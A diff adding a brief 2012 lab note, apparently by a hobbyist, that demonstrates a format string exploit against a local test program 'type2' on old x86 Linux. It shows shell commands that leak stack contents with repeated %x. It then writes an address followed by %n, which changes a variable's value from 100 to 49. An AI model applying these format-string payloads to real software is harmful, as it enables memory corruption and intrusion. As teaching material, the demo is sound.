@@ -1,0 +1,24 @@
+Shawn the R0ck - Dec 7 2012
+
+Format string vulnerability is the kind of old school stuff. I tested
+my example exploit on SUSE 8, which is a very old GNU/Linux distro. I
+also tested it on Slackware 13.37. It worked on both x86 platform.
+
+shawn@sl13:~/fmt_str_vuls$ ./type2 "AAAA`perl -e 'print "%x-" x 10'`"
+
+&i = 0xbffff0cc, value = 100
+input: AAAA%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-
+AAAAbffff0d0-64-b7fff534-b7fe03d0-10-b7fe1585-64-41414141-252d7825-78252d78-
+&i = 0xbffff0cc, value = 100
+shawn@sl13:~/fmt_str_vuls$ ./type2 "$(printf "\xcc\xf0\xff\xbf")`perl -e 'print "%x-" x 7'`%n"
+
+&i = 0xbffff0dc, value = 100
+input: ����%x-%x-%x-%x-%x-%x-%x-%n
+����bffff0e0-64-b7fff534-b7fe03d0-10-b7fe1585-64-
+&i = 0xbffff0dc, value = 100
+shawn@sl13:~/fmt_str_vuls$ ./type2 "$(printf "\xdc\xf0\xff\xbf")`perl -e 'print "%x-" x 7'`%n"
+
+&i = 0xbffff0dc, value = 100
+input: ����%x-%x-%x-%x-%x-%x-%x-%n
+����bffff0e0-64-b7fff534-b7fe03d0-10-b7fe1585-64-
+&i = 0xbffff0dc, value = 49
